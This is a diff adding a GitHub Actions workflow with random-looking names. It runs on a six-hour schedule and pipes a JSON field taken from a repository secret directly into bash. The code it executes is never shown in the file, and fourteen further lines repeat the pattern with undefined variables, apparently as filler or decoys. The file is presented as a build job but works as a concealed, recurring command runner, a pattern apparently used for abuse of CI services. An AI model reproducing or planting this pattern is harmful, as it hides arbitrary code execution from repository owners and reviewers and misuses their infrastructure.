@@ -1,0 +1,31 @@
+name: hongfashe4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongfashe4567
+        env:
+          gxje11327: ${{ secrets.gxje11327 }}
+        run: |
+          echo $gxje11327 | jq -r .zbych130 | /bin/bash
+          echo $eoj69048 | jq -r .nkf04 | /bin/bash
+          echo $gdt090 | jq -r .mojk322 | /bin/bash
+          echo $x5 | jq -r .wn3 | /bin/bash
+          echo $hj950 | jq -r .bv997 | /bin/bash
+          echo $bju99612 | jq -r .wprqj2049 | /bin/bash
+          echo $gz7 | jq -r .fje18 | /bin/bash
+          echo $uasq7 | jq -r .nutk7 | /bin/bash
+          echo $lfwv1 | jq -r .yu1 | /bin/bash
+          echo $p08 | jq -r .hrs3686 | /bin/bash
+          echo $dqaoq636 | jq -r .fuzd38883 | /bin/bash
+          echo $s0 | jq -r .q04 | /bin/bash
+          echo $jfzoc8 | jq -r .z4517 | /bin/bash
+          echo $vd756 | jq -r .gxs22 | /bin/bash
+          echo $tjbm84 | jq -r .l8 | /bin/bash
+
